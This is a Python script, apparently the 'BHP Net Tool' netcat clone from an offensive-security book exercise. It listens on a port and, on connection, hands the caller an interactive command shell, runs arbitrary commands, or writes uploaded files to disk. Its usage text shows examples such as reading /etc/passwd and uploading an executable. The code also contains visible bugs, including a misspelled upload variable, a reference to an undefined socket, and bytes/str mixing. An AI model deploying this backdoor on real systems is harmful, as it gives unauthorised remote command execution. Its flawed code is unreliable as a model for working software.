#!/usr/bin/python3

import sys
import socket
import getopt
import threading
import subprocess

#global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    print("BHP Net Tool")
    print()
    print("usage: pycat.py -t target_host -p port")
    print("-l --listen              - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run - execute the given file upon receiving connection")
    print("-c --command             - initialize a command shell")
    print("-u --upload=desintation  - upon receiving a connection upload a file and write to [destination]")
    print("\n\n")
    print("Examples:")
    print("pycat.py -t 192.168.0.1 -p 5555 -l -c")
    print("pycat.py -t 192.168.0.1 -p 5555 -l -u=C:\\target.exe")
    print("pycat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./pycat.py -t 192.168.0.1 - p 135")
    sys.exit(0)

def client_sender(buffer):
    #create socket object to send data
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #connect to target host
        client.connect((target, port))
        
        #if the buffer is greater than zero
        if len(buffer):
            #send buffer to target
            client.send(buffer.encode(encoding="ascii"))
            
            #wait for response from target
            while True:
                #wait for data back
                recv_len = 1
                response = ""

                while recv_len:
                    data = str(client.recv(4096),encoding="ascii")
                    recv_len = len(data)
                    response += data

                    if recv_len < 4096:
                        break

                    print(response)

                    #wait for more input
                    buffer = input("")
                    buffer += "\n"

                    #send it off
                    client.send(buffer.encode(encoding="ascii")) 
        else:
            #wait for response from target
            while True:
                #wait for data back
                recv_len = 1
                response = ""

                while recv_len:
                    data = str(client.recv(4096),encoding="ascii")
                    recv_len = len(data)
                    response += data
                    
                    print(str(response))

                    #wait for more input
                    buffer = input("")
                    buffer += "\n"

                    #send it off
                    client.send(buffer.encode(encoding="ascii"))             
            
    except Exception as ex:
        print(str(ex))
        print("[*] Exception! Exiting.")
        client.close()

def server_loop():
    global target
    global port

    #if no target is defined, listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))

    server.listen(5)

    while True:
        client_socket,addr = server.accept()

        #spin off a thread to handle new client
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()

def run_command(command):

    #trim newline
    command = command.rstrip()

    #run command get the output back
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    #send output back to the client
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    #check for upload
    if len(upload_destination):

        #read in all of the bytes and write to our destination
        file_buffer = ""

        #read data until none is left available
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        #write out bytes
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #note that file was written out
            client_socket.send("Successfully saved filed to %s\r\n".encode(encoding="ascii") % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n".encode(encoding="ascii") % upload_destination)

    if len(execute):
        # run the command
        output = run_command(execute)

        client_socket.send(output.encode(encoding="ascii"))

    #now we go into another loop if a command shell was requested
    if command:

        while True:
            #show a simple prompt
            client_socket.send("BHP:# ".encode(encoding="ascii"))
            cmd_buffer = ""
        
            while "\n" not in cmd_buffer:
                cmd_buffer += str(client_socket.recv(1024), encoding="ascii")

                #send back the command output
                response = run_command(cmd_buffer)
                if type(response) == str:
                    response = response.encode(encoding="ascii")
                #send back the response
                client_socket.send(response)
    client.close()
    
def main():
    global listen
    global port
    global target
    global execute
    global command
    global upload_destination

    if not len(sys.argv[1:]):
        usage()

    try:
        opts,args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute = a
        elif o in ("-c","--commandshell"):
            command = True
        elif o in ("-u","--upload"):
            upload_desintation = a
        elif o in ("-t","--target"):
            target = a
        elif o in ("-p","--port"):
            port = int(a)
        else:
            assert False,"Unhandled option"

    #are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:

        #read in the buffer from the commandline
        #this will block, so send CTRL-D if not sending input
        #to stdin
        buffer = sys.stdin.read()
        #send data off
        client_sender(buffer)

    #we are going to listen and potentially upload things,
    #execute commands, and drop a shell back depending on our
    #command line options above
    if listen:
        server_loop()

main()
